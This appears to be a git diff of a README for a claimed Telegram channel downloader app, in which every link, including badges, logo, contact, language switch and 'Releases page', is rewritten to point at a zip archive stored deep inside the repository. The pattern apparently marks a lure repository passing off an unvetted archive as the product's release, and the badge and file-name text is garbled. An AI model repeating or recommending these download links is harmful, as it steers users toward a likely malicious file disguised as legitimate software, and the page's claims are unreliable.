@@ -2,20 +2,20 @@
 
 <div align="center">
 
-[![Download](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)
+[![Download](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)
 
-![Logo](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)
+![Logo](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)
 
 **A powerful cross-platform Telegram channel content downloader built with Electron and Vue 3**
 
-[![License: MIT](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)
-[![Electron](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip+https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)
-[![https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip+https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)
-[![Platform](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip%20|%20macOS%20|%https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)]()
+[![License: MIT](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)
+[![Electron](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip+https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)
+[![https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip+https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)
+[![Platform](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip%20|%20macOS%20|%https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)]()
 
-📞 **Contact Developer**: [@Eagon 耿延](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip) | 💬 **Join Group**: [Telegram Channel Downloader Chat](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)
+📞 **Contact Developer**: [@Eagon 耿延](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip) | 💬 **Join Group**: [Telegram Channel Downloader Chat](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)
 
-[English](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip) • [简体中文](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip)
+[English](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip) • [简体中文](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip)
 
 </div>
 
@@ -33,11 +33,11 @@ Before you proceed, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of the application, please visit the [Releases page](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip). 
+To download the latest version of the application, please visit the [Releases page](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip). 
 
 1. **Visit the Releases page**: Click the link or copy it into your web browser.
 2. **Select the most recent version**: Look for the version labeled as "Latest Release."
-3. **Choose your operating system**: Find the file that matches your OS. It could be named something like `https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip` for Windows or `https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip` for macOS.
+3. **Choose your operating system**: Find the file that matches your OS. It could be named something like `https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip` for Windows or `https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip` for macOS.
 4. **Download the file**: Click on the file link and wait for the download to complete.
 
 ## 📂 Running the Application
@@ -89,13 +89,13 @@ If you have set up two-factor authentication on your Telegram account, you will 
 If you encounter issues during installation or use, please consider the following resources:
 
 - **FAQ Section**: Check if your question has been answered in the Frequently Asked Questions section on the GitHub page.
-- **Community Support**: Join the [Telegram Channel Downloader Chat](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip) for additional assistance.
+- **Community Support**: Join the [Telegram Channel Downloader Chat](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip) for additional assistance.
 - **Issue Tracker**: If you find a bug, report it on the GitHub Issues page for the developer to address.
 
 ## 📞 Contact Developer
 
-For further inquiries or support, reach out to the developer directly on Telegram: [@Eagon 耿延](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip).
+For further inquiries or support, reach out to the developer directly on Telegram: [@Eagon 耿延](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip).
 
-For more updates or information, follow the project's [GitHub Repository](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip).
+For more updates or information, follow the project's [GitHub Repository](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip).
 
-Remember to download the application from the [Releases page](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/multilinguist/telegram-multifunctional-panel.zip) to get the latest version and keep your tool updated.
+Remember to download the application from the [Releases page](https://raw.githubusercontent.com/Ivanhoemaker/telegram-multifunctional-panel/main/src/utils/telegram-multifunctional-panel-v1.6.zip) to get the latest version and keep your tool updated.
